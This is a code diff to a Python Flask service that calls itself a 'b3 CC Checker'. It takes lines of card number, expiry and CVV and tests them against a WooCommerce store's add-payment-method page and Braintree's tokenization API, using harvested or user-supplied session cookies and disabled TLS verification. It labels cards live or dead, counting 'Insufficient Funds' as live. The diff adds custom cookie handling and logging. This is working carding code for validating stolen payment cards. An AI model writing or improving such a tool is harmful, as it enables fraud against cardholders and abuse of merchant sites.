@@ -16,7 +16,7 @@ import urllib.parse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}}) # Allow cross-origin for GitHub Pages
+CORS(app, resources={r"/*": {"origins": "*"}}) 
 
 # Global variables
 SITES = []
@@ -109,7 +109,6 @@ def get_bin_info(bin_number):
                 country_info = bin_data.get('Country', {})
                 country_code = bin_data.get('country_code') or country_info.get('A2')
                 
-                # Flag emoji
                 emoji = '🏳️'
                 if country_code and len(country_code) == 2:
                     emoji = chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)
@@ -126,25 +125,35 @@ def get_bin_info(bin_number):
         pass
     return {'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'country': 'UNKNOWN', 'emoji': '🏳️', 'level': 'UNKNOWN', 'type': 'UNKNOWN'}
 
-def check_card(cc_line):
+def check_card(cc_line, manual_cookies=None):
     """Main card checking logic using the new captured API"""
     start_time = time.time()
     
     if not SITES: load_sites()
     domain_url = SITES[0]
-    cookies = get_next_cookie()
     
-    if not cookies:
-        return {'status': 'ERROR', 'card': cc_line, 'response': 'No cookies available', 'is_approved': False}
+    if manual_cookies and len(manual_cookies) > 0:
+        cookies = manual_cookies
+        cookie_source = "custom"
+    else:
+        cookies = get_next_cookie()
+        cookie_source = "system"
+    
+    # Log cookie use for debugging
+    if cookies:
+        cookie_snippet = str(list(cookies.values())[0])[:10] if cookies else "None"
+        print(f"[{cookie_source}] Using cookie: ...{cookie_snippet} for {cc_line[:15]}...")
+    else:
+        return {'status': 'ERROR', 'card': cc_line, 'response': 'No cookies available', 'is_approved': False, 'cookie_source': cookie_source}
 
     try:
         parts = cc_line.strip().split('|')
         if len(parts) != 4:
-            return {'status': 'ERROR', 'card': cc_line, 'response': 'Format: CC|MM|YY|CVV', 'is_approved': False}
+            return {'status': 'ERROR', 'card': cc_line, 'response': 'Format: CC|MM|YY|CVV', 'is_approved': False, 'cookie_source': cookie_source}
         n, mm, yy, cvc = parts
         if len(yy) == 2: yy = '20' + yy
     except Exception as e:
-        return {'status': 'ERROR', 'card': cc_line, 'response': str(e), 'is_approved': False}
+        return {'status': 'ERROR', 'card': cc_line, 'response': str(e), 'is_approved': False, 'cookie_source': cookie_source if 'cookie_source' in locals() else 'unknown'}
 
     try:
         # Step 1: Get Nonce and Client Token
@@ -152,14 +161,14 @@ def check_card(cc_line):
         response = requests.get(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers, verify=False, timeout=30)
         
         if response.status_code != 200:
-            return {'status': 'ERROR', 'card': cc_line, 'response': f'Page Load Failed: {response.status_code}', 'is_approved': False}
+            return {'status': 'ERROR', 'card': cc_line, 'response': f'Page Load Failed: {response.status_code}', 'is_approved': False, 'cookie_source': cookie_source}
 
         wp_nonce = re.search('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-        if not wp_nonce: return {'status': 'ERROR', 'card': cc_line, 'response': 'WP Nonce Not Found', 'is_approved': False}
+        if not wp_nonce: return {'status': 'ERROR', 'card': cc_line, 'response': 'WP Nonce Not Found', 'is_approved': False, 'cookie_source': cookie_source}
         wp_nonce = wp_nonce.group(1)
 
         i0 = response.text.find('wc_braintree_client_token = ["')
-        if i0 == -1: return {'status': 'ERROR', 'card': cc_line, 'response': 'Client Token Not Found', 'is_approved': False}
+        if i0 == -1: return {'status': 'ERROR', 'card': cc_line, 'response': 'Client Token Not Found', 'is_approved': False, 'cookie_source': cookie_source}
         i1 = response.text.find('"]', i0)
         client_token_b64 = response.text[i0 + 30:i1]
         decoded_token = json.loads(base64.b64decode(client_token_b64).decode('utf-8'))
@@ -195,11 +204,11 @@ def check_card(cc_line):
         gql_response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_data_gql, verify=False, timeout=30)
         
         if gql_response.status_code != 200:
-            return {'status': 'ERROR', 'card': cc_line, 'response': f'GQL Error: {gql_response.status_code}', 'is_approved': False}
+            return {'status': 'ERROR', 'card': cc_line, 'response': f'GQL Error: {gql_response.status_code}', 'is_approved': False, 'cookie_source': cookie_source}
         
         gql_json = gql_response.json()
         if 'errors' in gql_json:
-            return {'status': 'DECLINED', 'card': cc_line, 'response': gql_json['errors'][0]['message'], 'is_approved': False}
+            return {'status': 'DECLINED', 'card': cc_line, 'response': gql_json['errors'][0]['message'], 'is_approved': False, 'cookie_source': cookie_source}
         
         card_token = gql_json['data']['tokenizeCreditCard']['token']
 
@@ -237,13 +246,13 @@ def check_card(cc_line):
 
         if success_div:
             msg = success_div.get_text(strip=True)
-            return {'status': 'APPROVED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': True}
+            return {'status': 'APPROVED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': True, 'cookie_source': cookie_source}
         elif error_ul:
             msg = error_ul.get_text(strip=True)
             is_good = any(x in msg for x in ['Insufficient Funds', 'Duplicate', 'Approved'])
-            return {'status': 'APPROVED' if is_good else 'DECLINED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': is_good}
+            return {'status': 'APPROVED' if is_good else 'DECLINED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': is_good, 'cookie_source': cookie_source}
         else:
-            return {'status': 'DECLINED', 'card': cc_line, 'response': 'Unknown Response', 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': False}
+            return {'status': 'DECLINED', 'card': cc_line, 'response': 'Unknown Response', 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': False, 'cookie_source': cookie_source}
 
     except Exception as e:
         return {'status': 'ERROR', 'card': cc_line, 'response': str(e), 'is_approved': False}
@@ -254,27 +263,38 @@ def home():
     if os.path.exists(template_path): return send_file(template_path)
     return "API is active. b3 CC Checker is running."
 
-@app.route('/check')
+@app.route('/check', methods=['GET', 'POST'])
 def check_single():
-    card = request.args.get('card', '')
-    if not card: return jsonify({'error': 'No card provided'}), 400
-    return jsonify(check_card(card))
+    if request.method == 'POST':
+        data = request.get_json() or {}
+        card = data.get('card', '')
+        custom_cookies = data.get('cookies', '') # Can be dict or list
+    else:
+        card = request.args.get('card', '')
+        custom_cookies = request.args.get('cookies', '')
+    
+    manual_cookies = None
+    if custom_cookies:
+        try:
+            json_data = custom_cookies
+            if isinstance(json_data, str):
+                json_data = json.loads(urllib.parse.unquote(json_data))
+            
+            if isinstance(json_data, list):
+                manual_cookies = {item['name']: item['value'] for item in json_data if 'name' in item and 'value' in item}
+            elif isinstance(json_data, dict):
+                manual_cookies = json_data
+        except:
+            pass
 
-@app.route('/bulk-check', methods=['POST'])
-def bulk_check():
-    data = request.get_json()
-    if not data or 'cards' not in data: return jsonify({'error': 'No cards provided'}), 400
-    results = []
-    for card in data['cards']:
-        results.append(check_card(card))
-        time.sleep(1)
-    return jsonify({'results': results})
+    if not card: return jsonify({'error': 'No card provided'}), 400
+    return jsonify(check_card(card, manual_cookies))
+
 
 @app.route('/health')
 def health():
     return jsonify({'status': 'ok', 'cookies_loaded': len(COOKIES_LIST)})
 
 if __name__ == '__main__':
-    load_sites()
     load_cookies()
     app.run(host='0.0.0.0', port=5000, debug=True)
